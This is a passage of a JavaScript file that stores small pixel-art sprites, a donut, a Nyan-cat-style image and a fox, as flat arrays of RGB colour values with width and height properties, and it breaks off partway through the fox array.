var donut = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 255, 255, 255, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 164, 255, 172, 0, 0, 0, 0, 0, 0, 164, 255, 172, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 233, 158, 106, 233, 158, 106, 0, 0, 0, 0, 0, 0, 233, 158, 106, 233, 158, 106, 0, 0, 0, 0, 0, 0, 0, 0, 0, 233, 158, 106, 233, 158, 106, 0, 0, 0, 0, 0, 0, 233, 158, 106, 233, 158, 106, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 233, 158, 106, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
donut.width = 21;
donut.height = 16;
var nyan = [255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 162, 55, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 240, 45, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 234, 127, 181, 40, 255, 255, 142, 253, 255, 142, 253, 255, 142, 253, 181, 40, 255, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 234, 127, 255, 234, 127, 255, 234, 127, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 240, 45, 255, 240, 45, 255, 240, 45, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 255, 162, 55, 0, 0, 0, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 234, 127, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 240, 45, 255, 240, 45, 255, 240, 45, 255, 240, 45, 255, 240, 45, 255, 240, 45, 255, 240, 45, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 162, 55, 255, 162, 55, 0, 0, 0, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 0, 0, 0, 0, 0, 0, 255, 142, 253, 255, 142, 253, 181, 40, 255, 255, 142, 253, 255, 142, 253, 255, 234, 127, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 77, 255, 66, 77, 255, 66, 77, 255, 66, 255, 240, 45, 255, 240, 45, 255, 240, 45, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 234, 127, 0, 0, 0, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 0, 0, 0, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 234, 127, 255, 142, 253, 181, 40, 255, 255, 142, 253, 181, 40, 255, 255, 142, 253, 255, 142, 253, 181, 40, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 142, 253, 255,
    142, 253, 255, 142, 253, 255, 234, 127, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 139, 144, 145, 0, 0, 0, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 0, 0, 255, 77, 255, 66, 77, 255, 66, 77, 255, 66, 77, 255, 66, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 77, 255, 66, 77, 255, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 181, 40, 255, 255, 142, 253, 255, 142, 253, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 255, 255, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 255, 255, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 181, 40, 255, 181, 40, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 139, 144, 145, 0, 0, 0, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 0, 0, 0, 0, 0, 0, 255, 234, 127, 181, 40, 255, 255, 142, 253, 255, 142, 253, 255, 142, 253, 181, 40, 255, 255, 142, 253, 0, 0, 0, 139, 144, 145, 255, 139, 214, 255, 139, 214, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 255, 139, 214, 255, 139, 214, 0, 0, 0, 255, 255, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 181, 40, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 142, 253, 255, 142, 253, 255, 142, 253, 255, 142, 253, 0, 0, 0, 139, 144, 145, 255, 139, 214, 255, 139, 214, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 139, 144, 145, 255, 139, 214, 255, 139, 214, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 0, 0, 0, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 255, 234, 127, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 0, 0, 0, 139, 144, 145, 139, 144, 145, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255
];
nyan.width = 37;
nyan.height = 20;
var fox = [255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 255, 255, 0, 0, 0, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 0, 0, 0, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 121, 4, 255, 